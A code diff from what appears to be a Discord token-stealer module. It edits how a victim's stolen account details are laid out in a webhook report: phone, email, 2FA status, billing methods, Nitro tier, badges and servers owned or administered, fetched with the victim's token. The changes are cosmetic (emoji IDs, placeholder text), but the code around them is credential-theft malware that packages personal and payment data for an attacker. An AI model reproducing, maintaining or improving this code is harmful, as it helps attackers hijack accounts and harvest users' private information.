@@ -66,13 +66,13 @@ module.exports = async (webhook) => {
                                 },
                                 {
                                     name: "Phone:",
-                                    value: `\`${user.phone || 'None'}${user.mfa_enabled ? ' (2FA)' : ''}\``,
+                                    value: `\`${user.phone || '❓'}${user.mfa_enabled ? ' (2FA)' : ''}\``,
                                     inline: true
                                 },
                                 { name: "\u200b", value: "\u200b", inline: false },
                                 {
                                     name: "Email:",
-                                    value: `\`${user.email || 'None'}\``,
+                                    value: `\`${user.email || '❓'}\``,
                                     inline: true
                                 },
                                 {
@@ -167,8 +167,8 @@ async function getHQGuilds(guilds, token) {
             : 'No Invite';
 
         const emoji = guild.owner
-            ? `<:owner:963333541343686696> Owner`
-            : `<:staff:1178394965706031114> Admin`;
+            ? `<:Owner:963333541343686696> Owner`
+            : `<:Staff:1136740017822253176> Admin`;
         const members = `Members: \`${guild.member_count}\``;
         const name = `**${guild.name}** - (${guild.id})`;
 
@@ -189,12 +189,12 @@ async function getHQGuilds(guilds, token) {
 }
 
 function getBilling(billing) {
-    const paymentMap = {
+    const payment = {
         1: '💳',
-        2: '<:paypal:1129073151746252870>'
+        2: '<:Paypal:1129073151746252870>'
     };
-    let paymentMethods = billing.map(method => paymentMap[method.type] || '❓').join('');
-    return paymentMethods || '`None`';
+    let paymentMethods = billing.map(method => payment[method.type] || '❓').join('');
+    return paymentMethods || '`❓`';
 }
 
 function getNitro(flags) {
@@ -203,24 +203,24 @@ function getNitro(flags) {
         2: '`Nitro`',
         3: '`Nitro Basic`'
     };
-    return nitroDict[flags] || '`None`';
+    return nitroDict[flags] || '`❓`';
 }
 
 function getFlags(flags) {
     const flagsDict = {
-        '<:staff:1090015968618623129>': 0,
-        '<:partner:918207395279273985>': 1,
-        '<:events:898186057588277259>': 2,
-        '<:bughunter_1:874750808426692658>': 3,
-        '<:bravery:874750808388952075>': 6,
-        '<:brilliance:874750808338608199>': 7,
-        '<:balance:874750808267292683>': 8,
-        '<:early:944071770506416198>': 9,
-        '<:bughunter_2:874750808430874664>': 14,
-        '<:verifieddeveloper:1257040817600594101>': 17,
-        '<:certifiedmoderator:925562487280128061>': 18,
+        '<:DiscordEmloyee:1163172252989259898>': 0,
+        '<:PartneredServerOwner:1163172304155586570>': 1,
+        '<:HypeSquadEvents:1163172248140660839>': 2,
+        '<:BugHunterLevel1:1163172239970140383>': 3,
+        '<:HouseBravery:1163172246492287017>': 6,
+        '<:HouseBrilliance:1163172244474822746>': 7,
+        '<:HouseBalance:1163172243417858128>': 8,
+        '<:EarlySupporter:1163172241996005416>': 9,
+        '<:BugHunterLevel2:1163172238942543892>': 14,
+        '<:EarlyBotDeveloper:1163172236807639143>': 17,
+        '<:CertifiedModerator:1163172255489085481>': 18,
         '⌨️': 20,
-        '<:activedev:1042545590640324608>': 22
+        '<:ActiveDeveloper:1163172534443851868>': 22
     };
 
     let result = '';
@@ -230,19 +230,20 @@ function getFlags(flags) {
         }
     }
 
-    return result.trim() || '`None`';
+    return result.trim() || '`❓`';
 }
 
 function getRareFlags(flags) {
     const flagsDict = {
-        '<:staff:1090015968618623129>': 0,
-        '<:partner:918207395279273985>': 1,
-        '<:events:898186057588277259>': 2,
-        '<:bughunter_1:874750808426692658>': 3,
-        '<:early:944071770506416198>': 9,
-        '<:bughunter_2:874750808430874664>': 14,
-        '<:activedev:1042545590640324608>': 22,
-        '<:verifieddeveloper:1257040817600594101>': 17
+        '<:DiscordEmloyee:1163172252989259898>': 0,
+        '<:PartneredServerOwner:1163172304155586570>': 1,
+        '<:HypeSquadEvents:1163172248140660839>': 2,
+        '<:BugHunterLevel1:1163172239970140383>': 3,
+        '<:EarlySupporter:1163172241996005416>': 9,
+        '<:BugHunterLevel2:1163172238942543892>': 14,
+        '<:EarlyBotDeveloper:1163172236807639143>': 17,
+        '<:CertifiedModerator:1163172255489085481>': 18,
+        '<:ActiveDeveloper:1163172534443851868>': 22
     };
 
     let result = '';
